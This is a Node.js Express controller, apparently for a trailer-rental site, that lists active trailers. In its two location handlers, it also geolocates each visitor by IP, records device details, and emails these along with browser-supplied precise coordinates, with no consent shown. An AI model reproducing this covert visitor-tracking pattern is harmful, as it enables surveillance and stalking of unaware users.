const DAOReboque = require('../database/DAOReboque')
const Login = require('../bill_modules/Login')
const {clienteNome} = require('../helpers/getSessionNome')
const axios = require('axios');
const ServiceEmail = require('../modules/ServiceEmail')


class IndexController{

    static async getSalvarLocalizacao(req, res) {
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

        async function getLocalizacaoPorIP(ip) {
            try {
                const response = await axios.get(`http://ip-api.com/json/${ip}`);
                return response.data;
            } catch (error) {
                console.error("Erro ao buscar localização:", error);
                return null;
            }
        }
        let result = await getLocalizacaoPorIP(ip);
        let useragent = req.useragent
        
        const dadosDoDispositivo = {
            browser: useragent.browser,
            version: useragent.version,
            os: useragent.os,
            platform: useragent.platform,
            source: useragent.source,
        };
        await ServiceEmail.enviarLocalizacaoDoDispositivo(dadosDoDispositivo, result, result['lat'], result['lon'])
        res.render('financeiro')

    }

    static async postSalvarLocalizacao(req, res) {
        const { latitude, longitude } = req.body;
        await ServiceEmail.enviarLocalizacaoPrecisa(latitude, longitude)
        res.render('financeiro')
    }

    static async getIndex(req, res) {

        // await Login.cliente(process.env.CLIENTE_EMAIL_TESTE, process.env.CLIENTE_SENHA_TESTE, req)
    
        DAOReboque.getAllAtivos().then(reboques => {
            if(reboques){
                res.render('index', {user: clienteNome(req, res), mensagem: '',reboques: reboques})
            } else {
                res.render('erro', {mensagem: "Erro ao listar reboques."})
            }
        })
        
    }

}

module.exports = IndexController